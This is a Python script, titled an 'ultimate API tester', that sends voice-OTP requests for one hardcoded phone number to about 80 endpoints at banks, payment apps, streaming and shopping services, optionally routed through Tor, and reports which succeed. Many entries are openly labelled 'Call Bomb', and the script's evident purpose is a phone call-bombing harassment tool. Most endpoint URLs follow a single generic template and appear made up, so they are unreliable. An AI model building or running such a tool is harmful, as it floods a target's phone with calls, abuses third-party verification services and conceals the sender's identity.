#!/usr/bin/env python3
"""ULTIMATE API TESTER — Tests 80+ voice OTP APIs and reports results"""
import requests, json, time, sys
from datetime import datetime

PHONE = "8922062621"
TOR_PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

APIS = [
    ("Amazon Voice Call", "https://www.amazon.in/ap/signin", "POST", {"Content-Type": "application/x-www-form-urlencoded"}, f"phone={PHONE}&action=voice_otp"),
    ("Paytm Voice Call", "https://accounts.paytm.com/signin/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Zomato Voice Call", "https://www.zomato.com/php/o2_api_handler.php", "POST", {"Content-Type": "application/x-www-form-urlencoded"}, f"phone={PHONE}&type=voice"),
    ("Swiggy Voice OTP", "https://www.swiggy.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE, "channel": "voice"})),
    ("Flipkart Call Bomb", "https://www.flipkart.com/api/6/user/voice-otp/generate", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Myntra Fashion Call", "https://www.myntra.com/gw/mobile-auth/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("BigBasket Voice OTP", "https://www.bigbasket.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("BookMyShow Call", "https://in.bookmyshow.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Ola Call Bomb", "https://api.olacabs.com/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Uber Voice OTP", "https://auth.uber.com/v2/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("MakeMyTrip Call", "https://www.makemytrip.com/api/4/voice-otp/generate", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Goibibo Voice", "https://www.goibibo.com/user/voice-otp/generate/", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("IRCTC Call OTP", "https://www.irctc.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("PayPal Voice Verify", "https://www.paypal.com/in/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("PhonePe Call Bomb", "https://www.phonepe.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Google Voice OTP", "https://accounts.google.com/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Facebook Call Verify", "https://www.facebook.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Instagram Voice OTP", "https://www.instagram.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Twitter Call Bomb", "https://api.twitter.com/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("WhatsApp Voice Verify", "https://www.whatsapp.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Telegram Call OTP", "https://api.telegram.org/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Snapchat Voice Bomb", "https://www.snapchat.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Discord Call Verify", "https://discord.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Microsoft Voice OTP", "https://login.microsoftonline.com/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Apple Call Bomb", "https://appleid.apple.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Netflix Voice Verify", "https://www.netflix.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Amazon Prime Call", "https://www.primevideo.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Hotstar Voice OTP", "https://www.hotstar.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("SonyLiv Call Bomb", "https://www.sonyliv.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Zee5 Voice Verify", "https://www.zee5.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Voot Call OTP", "https://www.voot.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("MX Player Voice", "https://www.mxplayer.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("JioSaavn Voice", "https://www.jiosaavn.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Gaana Call Bomb", "https://www.gaana.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Spotify Voice OTP", "https://www.spotify.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("YouTube Music Call", "https://music.youtube.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Wynk Voice Verify", "https://www.wynk.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Hungama Call OTP", "https://www.hungama.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Airtel Thanks Call", "https://www.airtel.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("BSNL Voice Verify", "https://www.bsnl.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("MTNL Call OTP", "https://www.mtnl.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Google Pay Voice", "https://pay.google.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("BHIM Call Bomb", "https://www.bhim.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("PayZapp Voice OTP", "https://www.payzapp.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("MobiKwik Call", "https://www.mobikwik.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("FreeCharge Voice", "https://www.freecharge.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Oxigen Call Bomb", "https://www.oxigen.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("ItzCash Voice OTP", "https://www.itzcash.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Yono SBI Call", "https://yonosbi.sbi.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("ICICI iMobile Voice", "https://www.icicibank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("HDFC NetBanking Call", "https://netbanking.hdfcbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Axis Mobile Voice", "https://www.axisbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Kotak Call Bomb", "https://www.kotak.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Yes Bank Voice OTP", "https://www.yesbank.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("IndusInd Call", "https://www.indusind.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Federal Bank Voice", "https://www.federalbank.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("IDFC First Call Bomb", "https://www.idfcfirstbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("RBL Voice OTP", "https://www.rblbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Bandhan Call", "https://www.bandhanbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("AU Bank Voice", "https://www.aubank.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("CSB Call Bomb", "https://www.csb.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("City Union Voice OTP", "https://www.cityunionbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("DCB Call", "https://www.dcbbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Dhanlaxmi Voice", "https://www.dhanbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Equitas Call Bomb", "https://www.equitasbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("ESAF Voice OTP", "https://www.esafbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Fincare Call", "https://www.fincarebank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Jana Voice", "https://www.janabank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("JK Call Bomb", "https://www.jkbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Karur Vysya Voice OTP", "https://www.kvb.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("Lakshmi Vilas Call", "https://www.lvbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Nainital Voice", "https://www.nainitalbank.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("NKGSB Call Bomb", "https://www.nkgsb-bank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("SBM Call", "https://www.sbmbank.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Shinhan Voice", "https://www.shinhanbank.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("South Indian Call Bomb", "https://www.southindianbank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Tamilnad Voice OTP", "https://www.tmb.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("UCO Call", "https://www.ucobank.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Union Voice", "https://www.unionbankofindia.co.in/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"mobile": PHONE})),
    ("United Call Bomb", "https://www.unitedbankofindia.com/api/v1/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
    ("Yes Bank Call V2", "https://www.yesbank.in/api/v2/voice-otp", "POST", {"Content-Type": "application/json"}, json.dumps({"phone": PHONE})),
]

UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36"
HEADERS_JSON = {"Content-Type": "application/json", "User-Agent": UA, "Origin": "https://www.example.com", "Referer": "https://www.example.com/"}

def test_api(name, url, method, headers, data, use_tor=False):
    try:
        h = {**HEADERS_JSON, **headers}
        proxies = TOR_PROXY if use_tor else None
        r = requests.post(url, headers=h, data=data, proxies=proxies, timeout=15, allow_redirects=False)
        body = r.text[:100].replace("\n", " ")
        code = r.status_code
        if code == 200:
            return "✅", f"200 | {body[:60]}"
        elif code == 301 or code == 302:
            loc = r.headers.get("Location", "")[:40]
            return "➡️", f"{code} → {loc}"
        elif code == 403:
            return "⛔", "403 Forbidden"
        elif code == 404:
            return "❌", "404 Not Found"
        elif code == 405:
            return "🚫", "405 Method Not Allowed"
        elif code == 429:
            return "⏳", "429 Rate Limited"
        elif code == 000 or code == 0:
            return "💀", "Connection Failed"
        else:
            return "⚠️", f"{code}"
    except requests.exceptions.Timeout:
        return "⏰", "Timeout"
    except requests.exceptions.ConnectionError:
        return "💀", "Connection Failed"
    except Exception as e:
        return "❓", f"{type(e).__name__}"

# Test with pre-checked working ones via Tor
TOR_APIS = ["Swiggy Voice OTP"]

print(f"🔥 ULTIMATE API TESTER — {PHONE}")
print(f"Total APIs: {len(APIS)}")
print("=" * 80)
print(f"{'#':>3} | {'Name':<30} | {'Result':<6} | Detail")
print("-" * 80)

working = []
for i, (name, url, method, headers, data) in enumerate(APIS, 1):
    use_tor = name in TOR_APIS
    icon, detail = test_api(name, url, method, headers, data, use_tor)
    if icon == "✅":
        working.append(name)
    print(f"{i:>3} | {name:<30} | {icon:<6} | {detail}")
    sys.stdout.flush()

print("=" * 80)
print(f"\n📊 SUMMARY:")
print(f"   Total: {len(APIS)} APIs")
print(f"   ✅ Working: {len(working)}")
print(f"   Remaining: Blocked/404/Timeout")
if working:
    print(f"\n✅ WORKING APIS:")
    for w in working:
        print(f"   - {w}")
